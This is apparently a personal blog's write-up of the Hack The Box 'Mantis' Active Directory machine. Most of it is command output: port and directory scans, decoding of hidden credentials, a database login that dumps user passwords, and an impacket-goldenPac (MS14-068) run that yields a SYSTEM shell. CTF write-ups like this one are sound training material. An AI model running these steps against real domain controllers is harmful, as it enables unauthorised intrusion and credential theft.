---
title: "[HTB] Mantis"
permalink: /writeups/htb/mantis/
excerpt: "Quick write-up for the Mantis machine from Hack The Box."
tags:
  - hackthebox
  - activedirectory
  - pentest
  - writeup
---

---

{% include toc icon="cog" title="Mantis Solution" %}

The [Mantis](https://app.hackthebox.com/machines/Mantis) machine has been created by [lkys37en](https://app.hackthebox.com/users/709). This is an hard Windows Machine with a strong focus on Active Directory exploitation.
{: .text-justify}

![image-center](/images/htb/htb_mantis_infocard.png){: .align-center}

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}


A bit CTF-y

$ nmap -Pn -sV 10.129.157.63          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 06:56 EST
Nmap scan report for 10.129.157.63
Host is up (0.019s latency).
Not shown: 981 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-14 11:56:48Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
8080/tcp  open  http         Microsoft IIS httpd 7.5
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds
                                                                                                                       

htb.local

Orchard CMS

$ gobuster dir -u http://10.129.157.63:8080 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.157.63:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/14 06:59:43 Starting gobuster in directory enumeration mode
===============================================================
/_archive             (Status: 200) [Size: 2867]
/ADMIN                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2FADMIN]
/admin                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2Fadmin]
/Admin                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2FAdmin]
/archive              (Status: 200) [Size: 2866]                                                    
/Archive              (Status: 200) [Size: 2866]                                                    
/blogs                (Status: 200) [Size: 2913]                                                    
/tags                 (Status: 200) [Size: 2453]                                                    
                                                                                                    
===============================================================
2022/02/14 07:01:43 Finished
===============================================================
                                                                                            

$ nmap -Pn -sV -p1-10000 10.129.157.63
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 06:55 EST
Nmap scan report for 10.129.157.63
Host is up (0.017s latency).
Not shown: 9984 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-14 11:55:31Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1337/tcp open  http         Microsoft IIS httpd 7.5
1433/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5722/tcp open  msrpc        Microsoft Windows RPC
8080/tcp open  http         Microsoft IIS httpd 7.5
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.11 seconds



$ gobuster dir -u http://10.129.157.63:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.157.63:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/14 07:05:21 Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 162] [--> http://10.129.157.63:1337/secure_notes/]



$ wget http://10.129.157.63:1337/secure_notes/web.config                                                                                                                130 ⨯
--2022-02-14 09:16:25--  http://10.129.157.63:1337/secure_notes/web.config
Connecting to 10.129.157.63:1337... connected.
HTTP request sent, awaiting response... 404 Not Found
2022-02-14 09:16:25 ERROR 404: Not Found.

$ wget http://10.129.157.63:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt                                                          8 ⨯
--2022-02-14 09:16:50--  http://10.129.157.63:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
Connecting to 10.129.157.63:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 912 [text/plain]
Saving to: ‘dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt’

dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczN 100%[===========================================================================================>]     912  --.-KB/s    in 0s      

2022-02-14 09:16:50 (102 MB/s) - ‘dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt’ saved [912/912]

$ cat dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt 
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.


...[lots of new lines !]...


Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez  



$ python
Python 3.9.10 (main, Jan 16 2022, 17:12:18) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> pasw = int("010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001", 2)
>>> binascii.unhexlify("%x" % pasw)
b'@dm!n_P@ssW0rd!'




$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d                                                                     
6d2424716c5f53405f504073735730726421

$ echo 6d2424716c5f53405f504073735730726421 | xxd -r -p 
m$$ql_S@_P@ssW0rd!

$ impacket-mssqlclient 'sa@10.129.157.63'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'sa'.
                                                                                                                                                                                         
┌──(ax㉿nms)-[~]
└─$ impacket-mssqlclient 'admin@10.129.157.63'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands



SQL> SELECT name FROM master.dbo.sysdatabases;
name                                                                                                                               
--------------------------------------------------
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
orcharddb 

SQL> USE orcharddb;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.

SQL> SELECT table_name FROM information_schema.tables;
table_name                                                                                                                         

--------------------------------------------------------------------------------------------------------------------------------   

...[snip]...                                                                       

blog_Orchard_Users_UserPartRecord 

...[snip]...



SQL> SELECT Username, Password FROM blog_Orchard_Users_UserPartRecord;
Username                                                                                                                                                                                                                                                          Password                                                                                                                                                                                                                                                          

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

admin                                                                                                                                                                                                                                                             AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==                                                                                                                                                                                              

James                                                                                                                                                                                                                                                             J@m3s_P@ssW0rd!




$ crackmapexec smb 10.129.157.63 -u james -p 'J@m3s_P@ssW0rd!' -d htb.local              
SMB         10.129.157.63   445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.157.63   445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd!


$ rpcclient -U james 10.129.157.63  
Enter WORKGROUP\james's password: 
rpcclient $> lookupnames james
james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)

add etc hosts

10.129.157.63 mantis htb.local mantis.htb.local

$ impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file jrrqSECV.exe
[*] Opening SVCManager on mantis.....
[*] Creating service dXAi on mantis.....
[*] Starting service dXAi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
